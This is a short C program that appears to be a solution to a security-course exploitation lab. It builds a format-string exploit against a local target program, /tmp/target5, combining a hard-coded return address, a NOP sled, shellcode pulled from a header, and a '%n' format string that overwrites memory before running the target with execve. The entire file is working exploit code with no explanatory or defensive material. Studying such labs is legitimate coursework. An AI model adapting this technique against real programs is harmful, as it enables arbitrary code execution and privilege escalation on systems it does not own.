#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define NOP 0x90
int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[400];
  int i;
  int addr;
  char *format;
  
  addr = 0xbffffcd4;
  format = "%u%u%012582523u%n";
  
  *(int*)buf = addr;  
  for(i=4; i<399-strlen(format)-strlen(shellcode);i++){
    buf[i] = NOP;
  }
  strncpy((buf+399-strlen(format)-strlen(shellcode)), shellcode, strlen(shellcode));
  strncpy((buf+399-strlen(format)),format, strlen(format));
  buf[399] = 0x00;

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;
  
  //printf("\n agr[1] is %s \n", args[1]);
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
